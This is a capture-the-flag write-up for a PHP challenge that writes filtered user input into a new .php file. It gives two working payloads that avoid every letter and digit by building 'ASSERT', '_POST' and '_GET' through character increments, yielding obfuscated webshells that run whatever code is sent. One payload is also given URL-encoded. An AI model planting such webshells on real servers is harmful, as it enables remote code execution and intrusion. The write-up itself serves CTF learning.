# Challenge
```php 
<?php
ini_set("display_errors", "On");
error_reporting(E_ALL | E_STRICT);
if(!isset($_GET['c'])){
   show_source(__FILE__);
   die();
}
function rand_string( $length ) {
   $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";    
   $size = strlen( $chars );
   $str = '';
   for( $i = 0; $i < $length; $i++ ) {
	   $str .= $chars[ rand( 0, $size - 1 ) ];
   }
   return $str;
}
$data = $_GET['c'];
$black_list = array(' ', '!', '"', '#', '%', '&', '*', ',', '-', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', '<', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '\\', '^', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '|', '~');
foreach ($black_list as $b) {
   if (stripos($data, $b) !== false){
	   die("WAF!");
   }
}
$filename=rand_string(0x20).'.php';
$folder='uploads/';
$full_filename = $folder.$filename;
if(file_put_contents($full_filename, '<?php '.$data)){
   echo "<a href='".$full_filename."'>WebShell</a></br>";
   echo "Enjoy your webshell~";
}else{
   echo "Some thing wrong...";
}
```

# Solution
见Reference的文章。

payload1：
```php
<?php
$_='';$_[+$_]++;
$_=$_.'';
$__=$_[+''];
$_ = $__;
$___=$_;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__;
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;  
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__;
$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$____.=$__;
$_=$$____;
$___($_[_]);
```

`c=$_='';$_[%2b$_]%2b%2b;$_=$_.'';$__=$_[%2b''];$_=$__;$___=$_;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$___.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$____='_';$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$_=$$____;$___($_[_]);`



payload2:

```php 
<?php
$_=[].[];
$__='';
$_=$_[''];
$_=++$_;
$_=++$_;
$_=++$_;
$_=++$_;
$__.=$_; // E
$_=++$_;
$_=++$_;
$__=$_.$__; // GE
$_=++$_;
$_=++$_;
$_=++$_;
$_=++$_;
$_=++$_;
$_=++$_;
$_=++$_;
$_=++$_;
$_=++$_;
$_=++$_;
$_=++$_;
$_=++$_;
$_=++$_;
$__.=$_; // GET var_dump(${'_'.$__}[_](${'_'.$__}[__])); // $_GET["_"]($_GET["__"]);
```
# Refference 
+ [一些不包含数字和字母的webshell](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html#_4)
+ [php特殊webshell(无数字,字母,位运算)](http://www.jianshu.com/p/d23d4b1358f2)
+ [一道好玩的webshell题](https://chybeta.github.io/2017/07/15/%E4%B8%80%E9%81%93%E5%A5%BD%E7%8E%A9%E7%9A%84webshell%E9%A2%98/)